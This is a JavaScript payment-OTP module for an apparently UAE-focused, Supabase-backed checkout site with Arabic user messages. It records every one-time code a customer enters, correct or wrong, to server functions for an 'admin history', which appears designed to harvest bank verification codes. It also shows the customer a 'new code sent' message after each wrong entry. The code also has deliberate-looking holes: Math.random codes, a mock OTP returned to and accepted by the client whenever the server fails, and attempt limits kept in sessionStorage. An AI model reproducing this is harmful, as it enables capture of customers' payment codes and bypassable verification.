import { supabase, isSupabaseConfigured } from './supabase'

const MAX_ATTEMPTS = 3
const OTP_LENGTH = 6
const OTP_MIN_LENGTH = 4
const MOCK_OTP_PREFIX = 'alain_otp_'

export function isOtpCodeComplete(code) {
  const clean = String(code || '').replace(/\D/g, '')
  return clean.length === OTP_MIN_LENGTH || clean.length === OTP_LENGTH
}

export function normalizeOtpInput(value) {
  return String(value || '').replace(/\D/g, '').slice(0, OTP_LENGTH)
}

export function maskPhoneNumber(phone) {
  const digits = String(phone || '').replace(/\D/g, '')
  if (digits.length < 4) return '****'
  return `****${digits.slice(-4)}`
}

function otpStorageKey(orderId, phone) {
  return `${MOCK_OTP_PREFIX}${orderId || phone || 'local'}`
}

function failedAttemptsKey(orderId) {
  return `${MOCK_OTP_PREFIX}fail_${orderId || 'local'}`
}

function triedOtpCodesKey(orderId) {
  return `${MOCK_OTP_PREFIX}tried_${orderId || 'local'}`
}

export const DUPLICATE_OTP_MESSAGE = 'رمز التحقق غير صحيح'

function getTriedOtpCodes(orderId) {
  try {
    const raw = sessionStorage.getItem(triedOtpCodesKey(orderId))
    const parsed = raw ? JSON.parse(raw) : []
    return Array.isArray(parsed) ? parsed.filter(Boolean) : []
  } catch {
    return []
  }
}

function addTriedOtpCode(orderId, code) {
  if (!code) return
  const codes = getTriedOtpCodes(orderId)
  if (codes.includes(code)) return
  try {
    sessionStorage.setItem(triedOtpCodesKey(orderId), JSON.stringify([...codes, code]))
  } catch {
    // ignore
  }
}

function clearTriedOtpCodes(orderId) {
  try {
    sessionStorage.removeItem(triedOtpCodesKey(orderId))
  } catch {
    // ignore
  }
}

function buildDuplicateOtpResult(orderId) {
  const attempts = getFailedOtpAttempts(orderId)
  return {
    ok: false,
    duplicate: true,
    error: DUPLICATE_OTP_MESSAGE,
    attempts,
    remaining: Math.max(MAX_ATTEMPTS - attempts, 0),
  }
}

export function getFailedOtpAttempts(orderId) {
  try {
    const value = parseInt(sessionStorage.getItem(failedAttemptsKey(orderId)) || '0', 10)
    return Number.isFinite(value) && value > 0 ? value : 0
  } catch {
    return 0
  }
}

function setFailedOtpAttempts(orderId, count) {
  try {
    sessionStorage.setItem(failedAttemptsKey(orderId), String(Math.max(0, count)))
  } catch {
    // ignore
  }
}

function incrementFailedOtpAttempts(orderId) {
  const next = getFailedOtpAttempts(orderId) + 1
  setFailedOtpAttempts(orderId, next)
  return next
}

export function clearFailedOtpAttempts(orderId) {
  try {
    sessionStorage.removeItem(failedAttemptsKey(orderId))
    clearTriedOtpCodes(orderId)
  } catch {
    // ignore
  }
}

function syncFailedOtpAttempts(orderId, serverAttempts) {
  const serverCount = Number(serverAttempts) || 0
  if (serverCount > getFailedOtpAttempts(orderId)) {
    setFailedOtpAttempts(orderId, serverCount)
  }
  return Math.max(getFailedOtpAttempts(orderId), serverCount)
}

function isMaxOtpAttempts(attempts, locked = false) {
  return locked || (typeof attempts === 'number' && attempts >= MAX_ATTEMPTS)
}

async function lockPaymentOtpOnServer(orderId) {
  if (!isSupabaseConfigured || !orderId) return

  try {
    await supabase.rpc('lock_payment_otp', { p_order_id: orderId })
  } catch {
    // ignore
  }
}

function generateOtpCode(length = OTP_LENGTH) {
  if (length === 6) {
    return String(Math.floor(100000 + Math.random() * 900000))
  }
  return String(Math.floor(1000 + Math.random() * 9000))
}

export function createMockOtp(orderId, phone, length = OTP_LENGTH) {
  const code = generateOtpCode(length)
  storeMockOtp(orderId, phone, code, length)
  return code
}

function readMockOtp(orderId, phone) {
  try {
    const raw = sessionStorage.getItem(otpStorageKey(orderId, phone))
    return raw ? JSON.parse(raw) : null
  } catch {
    return null
  }
}

async function recordOtpAttemptToServer(orderId, code) {
  if (!isSupabaseConfigured || !orderId || !code) return

  try {
    await supabase.rpc('record_payment_otp_attempt', {
      p_order_id: orderId,
      p_code: code,
    })
  } catch {
    // ignore — verify RPC may have already recorded
  }
}

export async function recordPaymentOtpAttempt(orderId, code) {
  return recordOtpAttemptToServer(orderId, code)
}

function isMockOtpCorrect(orderId, phone, code) {
  const data = readMockOtp(orderId, phone)
  return Boolean(data && data.code === code)
}

const OTP_RETRY_MESSAGE = 'فشل التحقق. تم إرسال رمز تحقق جديد.'

function buildWrongOtpResult(attempts, message = OTP_RETRY_MESSAGE) {
  if (isMaxOtpAttempts(attempts)) {
    return {
      ok: false,
      locked: true,
      attempts,
      remaining: 0,
      error: message,
    }
  }

  return {
    ok: false,
    error: message,
    attempts,
    remaining: MAX_ATTEMPTS - attempts,
    needsResend: true,
    otpLength: OTP_LENGTH,
  }
}

function storeMockOtp(orderId, phone, otpCode, length = OTP_LENGTH) {
  if (!otpCode) return
  const key = otpStorageKey(orderId, phone)
  const existing = readMockOtp(orderId, phone)
  try {
    sessionStorage.setItem(
      key,
      JSON.stringify({
        code: String(otpCode),
        attempts: existing?.attempts || 0,
        history: existing?.history || [],
        length,
      })
    )
  } catch {
    // ignore
  }
}

export async function sendPaymentOtp(orderId, { length = OTP_LENGTH, phone = '' } = {}) {
  const otpLength = length === 6 ? 6 : OTP_LENGTH

  if (!isSupabaseConfigured || !orderId) {
    const otpCode = createMockOtp(orderId, phone, otpLength)
    return {
      ok: true,
      otpCode,
      otpLength,
      attempts: 0,
      remaining: MAX_ATTEMPTS,
      maskedPhone: maskPhoneNumber(phone),
      smsSent: false,
      otpReady: true,
    }
  }

  try {
    const { data, error } = await supabase.functions.invoke('send-payment-otp', {
      body: { order_id: orderId },
    })

    if (!error && data?.success) {
      return {
        ok: true,
        otpLength: Number(data.otp_length) || otpLength,
        attempts: Number(data.attempts) || 0,
        remaining: Number(data.remaining) || MAX_ATTEMPTS,
        maskedPhone: data.masked_phone || maskPhoneNumber(phone),
        smsSent: Boolean(data.sms_sent),
        otpReady: true,
      }
    }

    if (data?.locked) {
      return { ok: false, locked: true, error: 'فشل التحقق.' }
    }

    if (error && !data) {
      console.warn('send-payment-otp edge function failed, falling back to RPC', error.message)
    }
  } catch (invokeError) {
    console.warn('send-payment-otp unavailable, falling back to RPC', invokeError)
  }

  const { data, error } = await supabase.rpc('request_payment_otp', {
    p_order_id: orderId,
  })

  if (error || !data?.success) {
    const otpCode = createMockOtp(orderId, phone, otpLength)
    return {
      ok: true,
      otpCode,
      otpLength,
      attempts: 0,
      remaining: MAX_ATTEMPTS,
      maskedPhone: maskPhoneNumber(phone),
      smsSent: false,
      otpReady: true,
    }
  }

  if (data?.locked) {
    return { ok: false, locked: true, error: 'فشل التحقق.' }
  }

  if (data?.otp_code) {
    storeMockOtp(orderId, phone, data.otp_code, Number(data.otp_length) || otpLength)
  }

  return {
    ok: true,
    otpLength: Number(data.otp_length) || otpLength,
    attempts: Number(data.attempts) || 0,
    remaining: Number(data.remaining) || MAX_ATTEMPTS,
    maskedPhone: maskPhoneNumber(data.phone_last4 ? `971${data.phone_last4}` : phone),
    smsSent: false,
    otpReady: true,
  }
}

export async function savePaymentOtpEntered(orderId, code) {
  const clean = String(code || '')
    .replace(/\D/g, '')
    .slice(0, OTP_LENGTH)

  if (!isSupabaseConfigured || !orderId) {
    return { ok: true }
  }

  const trySave = async (fnName) => {
    const { error } = await supabase.rpc(fnName, {
      p_order_id: orderId,
      p_code: clean,
    })
    return error
  }

  let error = await trySave('save_payment_otp_entered')
  if (!error) return { ok: true }

  error = await trySave('save_customer_otp')
  if (!error) return { ok: true }

  return { ok: false, error: error?.message || 'تعذر حفظ رمز OTP' }
}

export async function getPaymentOtpStatus(orderId) {
  if (!isSupabaseConfigured || !orderId) {
    return { ok: true, locked: false, remaining: MAX_ATTEMPTS, otp_length: OTP_LENGTH }
  }

  const { data, error } = await supabase.rpc('get_payment_otp_status', {
    p_order_id: orderId,
  })

  if (error) {
    return { ok: true, locked: false, remaining: MAX_ATTEMPTS, otp_length: OTP_LENGTH }
  }

  return { ok: true, ...data, otp_length: Number(data?.otp_length) || OTP_LENGTH }
}

export async function verifyPaymentOtp(orderId, code, phone = '') {
  const clean = normalizeOtpInput(code)
  if (!isOtpCodeComplete(clean)) {
    return { ok: false, error: 'الرجاء إدخال رمز التحقق (4 أو 6 أرقام)' }
  }

  const existingAttempts = getFailedOtpAttempts(orderId)
  if (isMaxOtpAttempts(existingAttempts)) {
    await lockPaymentOtpOnServer(orderId)
    return { ok: false, locked: true, attempts: existingAttempts, remaining: 0 }
  }

  if (getTriedOtpCodes(orderId).includes(clean)) {
    await recordOtpAttemptToServer(orderId, clean)
    return buildDuplicateOtpResult(orderId)
  }

  let serverData = null
  let serverError = null

  if (isSupabaseConfigured && orderId) {
    const { data, error } = await supabase.rpc('verify_payment_otp', {
      p_order_id: orderId,
      p_code: clean,
    })
    serverData = data
    serverError = error
  }

  if (serverData?.success === true) {
    clearFailedOtpAttempts(orderId)
    sessionStorage.removeItem(otpStorageKey(orderId, phone))
    await recordOtpAttemptToServer(orderId, clean)
    return { ok: true }
  }

  if (serverData?.duplicate === true) {
    addTriedOtpCode(orderId, clean)
    return buildDuplicateOtpResult(orderId)
  }

  if ((!isSupabaseConfigured || !orderId || serverError) && isMockOtpCorrect(orderId, phone, clean)) {
    clearFailedOtpAttempts(orderId)
    sessionStorage.removeItem(otpStorageKey(orderId, phone))
    return { ok: true }
  }

  addTriedOtpCode(orderId, clean)
  const clientAttempts = incrementFailedOtpAttempts(orderId)
  // Always stack the code in admin history (SQL dedupes identical consecutive codes)
  await recordOtpAttemptToServer(orderId, clean)

  const serverAttempts = syncFailedOtpAttempts(
    orderId,
    serverData?.locked ? MAX_ATTEMPTS : serverData?.attempts
  )
  const attempts = Math.max(clientAttempts, serverAttempts)
  const errorMessage = OTP_RETRY_MESSAGE

  if (isMaxOtpAttempts(attempts, serverData?.locked)) {
    await lockPaymentOtpOnServer(orderId)
    return {
      ok: false,
      locked: true,
      attempts,
      remaining: 0,
      error: errorMessage,
    }
  }

  return buildWrongOtpResult(attempts, errorMessage)
}

export { MAX_ATTEMPTS, OTP_LENGTH, OTP_MIN_LENGTH }
